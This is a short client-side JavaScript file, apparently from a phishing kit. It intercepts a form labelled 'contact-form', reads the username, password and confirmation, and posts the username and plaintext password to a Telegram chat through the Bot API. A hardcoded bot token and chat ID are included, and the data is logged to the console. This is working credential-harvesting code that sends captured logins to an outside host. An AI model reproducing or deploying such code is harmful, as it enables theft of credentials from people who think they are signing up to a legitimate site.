const formulario = document.getElementById('contact-form');

formulario.addEventListener('submit', async (e) => {
    e.preventDefault();

    const usuario = formulario.usuario?.value || "";
    const contraseña = formulario.contraseña?.value || "";
    const confirmar = formulario.confirmar?.value || "";

    if (contraseña !== confirmar) {
        alert("Las contraseñas no coinciden.");
        return;
    }

    // 🟢 Reemplaza con tu token de bot y tu chat ID
    const BOT_TOKEN = "8168160200:AAG8L_5th20MDegla-7VVHJImDFJynwWLBM";
    const CHAT_ID = "6719366535"; 

    // Mensaje a enviar
    const mensaje = `🚀 Nuevo Registro:\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contraseña}`;

    try {
        // Imprimir los datos para depuración
        console.log(`Enviando mensaje a Telegram con los siguientes datos:`);
        console.log(`Bot Token: ${BOT_TOKEN}`);
        console.log(`Chat ID: ${CHAT_ID}`);
        console.log(`Mensaje: ${mensaje}`);
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensaje,
                parse_mode: "Markdown"
            })
        });

        // Si la respuesta no es exitosa, lanza un error
        if (!response.ok) throw new Error(`Error: ${response.status} - ${response.statusText}`);
        
        const data = await response.json();
        
        // Imprime la respuesta para depuración
        console.log('Respuesta de Telegram:', data);
        
        alert("Datos enviados correctamente a Telegram");

    } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error);
        alert("Hubo un error al enviar los datos.");
    }
});
